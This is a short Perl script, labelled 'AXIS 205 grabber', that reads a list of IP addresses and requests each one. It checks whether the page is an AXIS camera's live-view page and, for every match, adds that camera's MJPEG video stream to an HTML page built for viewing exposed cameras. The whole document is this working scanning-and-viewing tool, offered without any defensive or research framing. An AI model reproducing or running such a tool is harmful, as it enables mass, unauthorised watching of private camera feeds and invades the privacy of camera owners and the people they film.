#!/usr/bin/perl
# Tested on AXIS 205

use LWP::UserAgent;

system $^O eq 'MSWin32' ? 'cls' : 'clear';

print "\t\n      AXIS 205 grabber\n\n";

open(op,"<$ARGV[0]") or die "$!";
while(<op>){
chomp($ip = $_);

my $ua = LWP::UserAgent->new();

$ua->agent("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36");

my $req = $ua->get("http://".$ip."/")->content;

if($req =~/Live view \/ - AXIS/) { 


print "\n  [".$ip."] => Good Axis Camera";

open(savee, ">>axis.html");
print savee "<h1>".$ip."<\/h1><br><br><iframe src=\"http:\/\/".$ip."\/mjpg\/video.mjpg\" width=\"630\" height=\"500\"><\/iframe><br><br>";
close savee;

           }
       }
